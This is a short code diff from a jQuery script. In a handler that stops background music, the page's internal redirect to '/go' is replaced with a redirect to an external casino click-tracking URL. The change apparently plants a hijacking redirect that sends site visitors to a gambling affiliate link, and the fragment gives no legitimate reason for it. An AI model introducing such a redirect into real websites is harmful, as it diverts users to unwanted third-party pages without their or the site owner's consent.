@@ -144,7 +144,7 @@ jQuery(function() {
         musicSource.stop();
         musicSource = null;
 
-        window.location.href = '/go';
+        window.location.href = 'https://trck.bestonlinecasino.club/click';
     });
     
 
